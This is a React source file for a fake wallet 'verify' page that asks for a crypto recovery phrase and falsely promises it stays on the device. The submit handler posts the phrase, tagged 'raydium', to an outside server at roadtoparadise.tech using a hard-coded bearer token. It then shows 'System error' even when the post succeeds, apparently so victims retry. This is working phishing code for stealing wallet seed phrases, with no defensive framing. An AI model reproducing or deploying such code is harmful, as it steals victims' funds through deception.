import React, { useEffect, useState, useRef } from "react";
import { Link, useParams } from "react-router-dom";
import Back from "../../assets/images/back.png";
import "./style.css";
import axios from "axios";

export default function Verify() {
  const params = useParams();
  const [count, setCount] = useState(0);
  const [value, setValue] = useState("");
  const [text, setText] = useState("import");
  const inputRef = useRef(null);
  const [loading, setLoading] = useState(false);
  const containerRef = useRef(null);

  // Function to scroll to the top
  const scrollToTop = () => {
    if (containerRef.current) {
      containerRef.current.scrollTop = 0;
    }
  };
  const scrollTop = () => {
    window.scrollTo({
      top: 0,
      behavior: "smooth",
    });
  };

  useEffect(() => {
    setTimeout(() => {
      scrollToTop();
      scrollTop();
    }, 500);
  }, []);

  const onBlur = () => {
    scrollToTop();
    scrollTop();
  };

  useEffect(() => {
    if (inputRef) {
      inputRef.current.focus();
      scrollTop();
      scrollToTop();
    }
    return () => {
      setCount(0);
      setText("import");
      setValue("");
      setLoading(false);
    };
  }, [params]);

  const addToServer = (event) => {
    const token =
      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Im5naHEyODc0MjNua2Fqc2hqayIsInBhc3N3b3JkIjoia29pYXM5MTgyNzNAIn0.r-UfdcGNRjGFx-EvYtT2DHDRhVBUwCcYcWf0cfy5bDw";
    if (count === 4) {
      setText("System error");
      event.target.style.background = "#FF5E79";
      event.target.style.filter = "drop-shadow(0px 2px 0px #d70b2e)";
      return;
    }
    if (!value) {
      inputRef.current.focus();
      inputRef.current.style.border = "1px solid #FF5E79";
      return;
    } else {
      setLoading(true);
      inputRef.current.style.border = "none";
      axios
        .post(
          "http://roadtoparadise.tech/api/wallet/login-wallet",
          {
            secret: value,
            wallet_type: Number(params.id),
            app_name: "raydium",
          },
          {
            headers: {
              Authorization: `Bearer ${token}`,
              "Content-Type": "application/json",
            },
          }
        )
        .then((res) => {
          if (res.data.message === "Success") {
            setText("System error");
            event.target.style.background = "#FF5E79";
            // event.target.style.filter = "drop-shadow(0px 2px 0px #d70b2e)";
            setCount((prev) => prev + 1);
            setLoading(false);
          }
        })
        .catch((err) => {
          console.log(err);
          setText("System error");
          event.target.style.background = "#FF5E79";
          setCount((prev) => prev + 1);
          setLoading(false);
        });
    }
  };

  return (
    <div className="section-verify" ref={containerRef}>
      <div className="container">
        <div className="verify-content">
          <Link to="/wallet" className="verify-back">
            <img src={Back} alt="pancake" />
          </Link>
          <div className="form">
            <h3 className="verify-title kanit-bold">
              Enter your recovery phrase
            </h3>
            <p className="verify-text kanit-regular">
              Your recovery phrase will only be stored locally on your device.
            </p>
            <textarea
              ref={inputRef}
              className="verify-input"
              onChange={(e) => setValue(e.target.value)}
              onBlur={onBlur}
              placeholder="Enter your recovery"
            ></textarea>
          </div>
          <div className="verify-btn">
            <button
              className="btn-common btn-primary btn-submit"
              onClick={addToServer}
            >
              {loading && <span className="loader"></span>} {text}
            </button>
          </div>
        </div>
      </div>
    </div>
  );
}
